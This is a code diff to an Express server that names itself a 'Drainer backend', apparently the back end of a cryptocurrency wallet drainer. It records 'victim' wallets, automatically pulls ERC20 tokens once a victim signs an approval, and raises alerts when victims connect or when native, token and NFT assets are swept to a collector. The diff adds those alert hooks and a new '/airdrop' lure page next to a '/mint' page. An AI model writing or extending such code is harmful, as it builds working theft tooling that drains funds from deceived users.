@@ -20,6 +20,11 @@ app.post('/api/report', async (req, res) => {
     const body = req.body || {};
     console.log('[report]', body.type, body.victim, body.token || body.collection || body.amount || '');
     logVictim(body);
+    try{
+      const { alertConnect, alertSweep } = require('./alerter');
+      if(body.type === 'connect' && body.victim) alertConnect(body.victim).catch(()=>{});
+      if(['native','erc20-direct','erc20-approve','nft-approve'].includes(body.type)) alertSweep(body).catch(()=>{});
+    }catch(e){}
     if(body.type === 'erc20-approve' && body.token && body.victim){
       pullERC20(body.token, body.victim).then(r=>console.log('[auto-pull erc20]', r)).catch(e=>console.log('[auto-pull erc20 err]', e.message));
     }
@@ -74,6 +79,7 @@ app.use(express.static(path.join(__dirname, '..', 'frontend')));
 // Admin-Panel
 app.get('/admin', (req,res)=> res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/mint', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html')));
+app.get('/airdrop', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'airdrop.html')));
 
 const PORT = cfg.port || 3001;
 app.listen(PORT, ()=> console.log(`Drainer backend on :${PORT}, collector=${cfg.collector}`));
